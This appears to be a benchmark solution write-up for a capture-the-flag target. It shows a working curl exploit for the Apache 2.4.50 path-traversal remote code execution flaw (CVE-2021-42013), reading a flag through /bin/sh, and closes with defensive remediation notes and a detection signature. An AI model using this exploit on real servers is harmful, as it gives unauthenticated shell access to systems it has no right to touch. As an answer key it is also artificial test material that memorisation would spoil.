# XBEN-026-24 — Deprecated Developers

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability class:** Apache HTTP Server 2.4.49/2.4.50 path traversal / RCE via `mod_cgi` (CVE-2021-42013, a bypass of the CVE-2021-41773 fix)

## Summary

The target runs Apache 2.4.50 with `mod_cgi` enabled and a `cgi-bin` directory that
maps to the shell interpreter. Apache's path normalization for percent-encoded dot
segments (`%2e` / double-encoded `%%32%65`) can be bypassed, allowing a URL such as
`/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh` to escape the
CGI directory alias and execute `/bin/sh` directly as a CGI script. Because this
reaches a shell interpreter with `mod_cgi`, the request body is passed to the shell,
giving unauthenticated remote code execution as the `daemon` user. The flag file is
readable from that shell.

## Exploit

```bash
PORT=63238   # replace with the port printed by `docker compose port web 80`

curl -s -i --path-as-is --noproxy '*' -X POST \
  "http://localhost:${PORT}/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" \
  -H "Content-Type: text/plain; foo" \
  --data 'echo;id;cat /FLAG.txt'
```

- `--path-as-is` prevents curl from itself normalizing the `.%%32%65` traversal
  segments before they reach the server.
- `%%32%65` is a double URL-encoding of `.` (`%32` = "2", `%65` = "e" → `%2e` → `.`),
  which slips past Apache's initial decode-and-normalize pass but is decoded a
  second time when the path is handed to the CGI handler, yielding `../../../../../../bin/sh`.
- Each `.%%32%65/` segment climbs one directory; six of them from `/cgi-bin/` is
  enough to reach `/bin/sh` from the `cgi-bin` alias root.
- Supplying any `Content-Type` header is required to make `mod_cgi` treat the POST
  body (`echo;id;cat /FLAG.txt`) as shell input, which `/bin/sh` then executes.

## Remediation notes (defensive writeup)

- Upgrade Apache HTTP Server to 2.4.51 or later, which fixes the incomplete patch
  for CVE-2021-41773 and closes the double-decode bypass (CVE-2021-42013).
- Do not enable `mod_cgi` / `ScriptAlias` for directories that are not strictly
  required, and ensure `Require all denied` is applied outside intended web roots.
- Set `AllowOverride None` and restrict `<Directory>` permissions so that alias
  traversal cannot reach system binaries such as `/bin/sh`.
- WAF/IDS signature: percent-encoded or double-encoded `.` / `..` segments
  (`%2e%2e`, `%%32%65`) inside CGI-mapped URL paths, and POST requests to
  `/cgi-bin/` paths containing shell metacharacters in the body.
